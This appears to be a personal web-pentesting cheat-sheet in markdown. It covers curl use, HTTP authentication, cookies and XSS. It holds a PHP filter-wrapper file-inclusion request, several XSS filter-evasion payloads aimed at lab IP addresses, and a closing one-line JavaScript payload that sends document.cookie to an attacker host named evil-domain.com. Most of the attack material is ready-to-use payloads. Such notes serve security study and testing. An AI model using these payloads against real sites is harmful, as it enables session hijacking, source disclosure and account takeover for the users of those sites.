# Web apps

## Command line GET & POST

    # curl -s "http://192.168.1.23/?lang=php://filter/convert.base64-encode/resource=fr"

    Curl options
    -s   : Avoid showing progress bar
    -D filename : Dump headers to a file, but - sends it to stdout
    -D - : Dump headers to a file, but - sends it to stdout
    -o /dev/null : Ignore response body


## HTTP authentication
HTTP also provides mechanisms to authenticate users. There are three methods available as part of the protocol:
- Basic Authentication: the username and password are encoded using base64 and sent using an Authorization header: 
    `Authorization: basic YWRtaW46YWRtaW4K.`
- Digest Authentication: the server sends a challenge (unique information to be used), the client responds to this challenge (hash information including the password provided by the user). This mechanism prevents the password from being sent unencrypted to the server.
- NTLM authentication: that is mostly used in the Microsoft world and is quite similar to Digest.


## Cookies

````http
    # curl <host> /sample_page.html HTTP/2.0
    HTTP/2.0 200 OK
    Content-type: text/html
    Set-Cookie: yummy_cookie=choco
    Set-Cookie: tasty_cookie=strawberry
    Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly

    GET /sample_page.html HTTP/2.0
    Host: www.example.org
    Cookie: yummy_cookie=choco; tasty_cookie=strawberry

    Note : Debian Php stores cookies at:
    # cat /var/lib/php5/sess_o8d7lr4p16d9gec7ofkdbnhm93
````



## XSS

https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet

### Basic
```html
<script>alert(1);</script>
```

### Filter : script tag
```html
<sRript>alert(1);</sCript>
<scr<script>ipt>alert(1);</sc</script>ript>
```
```
http://12.0.0.11/xss/example3.php?name=<scr<script>ipt>alert(1);</sc</script>ript>
http://12.0.0.11/xss/example3.php?name=%3Cscr%3Cscript%3Eipt%3Ealert(1);%3C/sc%3C/script%3Eript%3E
```






### Stole cookies
    (new Image()).src = "http://www.evil-domain.com/steal-cookie?cookie=" + document.cookie;

